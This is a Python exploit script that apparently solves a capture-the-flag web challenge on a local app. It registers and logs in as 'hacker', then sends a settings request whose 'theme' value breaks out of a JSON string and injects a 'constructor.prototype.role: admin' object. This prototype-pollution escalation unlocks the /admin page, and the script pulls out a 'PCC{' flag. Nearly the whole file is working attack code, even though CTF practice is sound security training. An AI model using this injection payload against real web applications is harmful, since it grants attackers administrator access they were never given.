import requests
import json

# Configuration
BASE_URL = "http://localhost:3000/"
USERNAME = "hacker"
PASSWORD = "password123"

def log(msg):
    print(f"[*] {msg}")

def main():
    s = requests.Session()

    # 1. Register
    log(f"Registering user {USERNAME}...")
    res = s.post(f"{BASE_URL}/register", data={
        "username": USERNAME,
        "password": PASSWORD
    })
    if "Account created" in res.text or "Username already exists" in res.text:
        log("Registration successful (or user already exists)")
    else:
        print("[-] Registration failed")
        print(res.text)
        return

    # 2. Login
    log("Logging in...")
    res = s.post(f"{BASE_URL}/login", data={
        "username": USERNAME,
        "password": PASSWORD
    })
    if "Dashboard" in res.text or res.status_code == 302:
        log("Login successful")
    else:
        print("[-] Login failed")
        return

    # 3. Exploit Prototype Pollution
    # We need to inject into the JSON string in app.js:
    # JSON.parse(`{"theme": "${theme}", "language": "${language}", "notifications": false}`)
    # We want to inject __proto__.
    # Payload for theme: ", "constructor": {"prototype": {"role": "admin"}}, "x": "
    
    log("Sending exploit payload...")
    payload = {
        "theme": '", "constructor": {"prototype": {"role": "admin"}}, "x": "',
        "language": "en",
        "notifications": False
    }
    
    res = s.post(f"{BASE_URL}/api/settings", json=payload)
    log(f"Exploit response: {res.text}")

    # 4. Access Admin Page
    log("Accessing admin page...")
    res = s.get(f"{BASE_URL}/admin")
    
    if "PCC{" in res.text:
        log("Success! Found flag:")
        # Extract flag
        import re
        match = re.search(r'PCC\{[^}]+\}', res.text)
        if match:
            print(f"\n[+] FLAG: {match.group(0)}\n")
        else:
            print("[-] Could not extract flag with regex, but 'PCC{' was found.")
            print(res.text)
    else:
        print("[-] Failed to access admin page or find flag.")
        if "Access Denied" in res.text:
            print("[-] Access Denied - Exploit might have failed.")
        else:
            print(res.text[:500])

if __name__ == "__main__":
    main()
